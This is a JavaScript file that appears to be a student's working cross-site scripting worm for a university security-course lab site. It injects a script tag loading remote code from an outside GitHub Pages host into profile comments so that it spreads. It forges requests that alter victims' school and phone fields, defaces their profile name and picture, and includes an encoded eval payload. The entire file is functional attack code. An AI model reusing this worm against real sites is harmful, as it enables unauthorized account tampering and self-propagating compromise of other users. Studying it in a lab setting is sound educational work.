/*jshint esversion: 6 */

const payload1 = `
            <h3>CSEC 380 Answers (Recorded)</h3>
            <audio id = "rick" controls="" autoplay="" muted="">
                <source src="https://the360report.com/wp-content/uploads/2021/09/Rick_Astley_-_Never_Gonna_Give_You_Up.mp3" type="audio/mpeg">
            </audio>
            `

const payload = "<script>eval(atob(\"PGgzPkNTRUMgMzgwIEFuc3dlcnMgKFJlY29yZGVkKTwvaDM+\"));</script>";
const ppayload = "<script src=\"https://pws1453.github.io/postreq.js\"></script>"


const links = ["https://c.tenor.com/8EAnAZozlWUAAAAd/mark-zuckerberg-adjust.gif",
	"https://c.tenor.com/rF2ktCIGGc8AAAAd/lol-limewire-limewire.gif",
    "https://i.kym-cdn.com/entries/icons/original/000/028/501/bezos.jpg",
    "https://i.kym-cdn.com/photos/images/newsfeed/002/255/815/cb0.png",
    "https://i.kym-cdn.com/photos/images/newsfeed/001/442/344/7e3.jpg"]

const unis = ["Rochester Institute of Technology", "University of Rochester",
	"University at Buffalo", "Buffalo State College", "SUNY Brockport",
	"University at Waterloo", "SUNY Geneseo", "University of Toronto"
];

const zipcodes = ["315", "585", "716"];
const jsonIn = ["Zucc", "Limewire", "Bezos", "Stop", "Chungus"];

function getRandomInt(max) {
	return Math.floor(Math.random() * max);
}


function post_About() {
	var r2 = getRandomInt(7);
	var r3 = getRandomInt(2);


	var university = unis[r2];
    var senduni = encodeURIComponent(university);

	var number = Math.floor(1000000 + Math.random() * 9000000).toString();
	var pnumber = zipcodes[r3] + number;
    var sendphone = encodeURIComponent(pnumber);



	var xhr = new XMLHttpRequest();
	xhr.open("POST", `http://csec380-core.csec.rit.edu:86/change_about.php`, true);
	//Send the proper header information along with the request
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send(`name=school&value=${senduni}`);

    var xhs = new XMLHttpRequest();
	xhs.open("POST", `http://csec380-core.csec.rit.edu:86/change_about.php`, true);
	//Send the proper header information along with the request
	xhs.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhs.send(`name=phone&value=${sendphone}`);
}

function change_Profile(){
    oof = document.getElementById("name");
    oof.innerText = "Victim of worm!";
    document.body.style.backgroundColor = "black";
    eeek = document.getElementById("fb-image-lg");
    eeek.src = "https://pws1453.github.io/shrek.jpg";
}

function change_Picture(){
    var r1 = getRandomInt(4);
    var key = encodeURIComponent(links[r1]);


    eeel = document.getElementsByClassName("fb-image-profile");
    eeel.src = key;

    var xht = new XMLHttpRequest();
    xht.open("GET", `/change_photo.php?type=profile&url=${key}`,true);
    xht.send(); 
}

function spread_Worm(){
    for(let i = 134; i < 135; i++) {
        var id = i;
        var xhy = new XMLHttpRequest();
        var xhz = new XMLHttpRequest();
        var urlpayload = encodeURIComponent(ppayload)
        var urlbrag = encodeURIComponent("I got XSSed!")
        xhy.open("GET", `/add_comment.php?type=profile&id=${id}&comment=${urlbrag}`,true);
        xhy.send(); 
        xhz.open("GET", `/add_comment.php?type=profile&id=${id}&comment=${urlpayload}`,true);
        xhz.send(); 
    }
}

// GET /add_comment.php?id=127&comment=oof

const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
//if (cookies.get("rekt") != "yes") {
    spread_Worm()
//}
post_About();
change_Profile();
setTimeout(change_Picture,1000)

document.cookie = "rekt=yes"
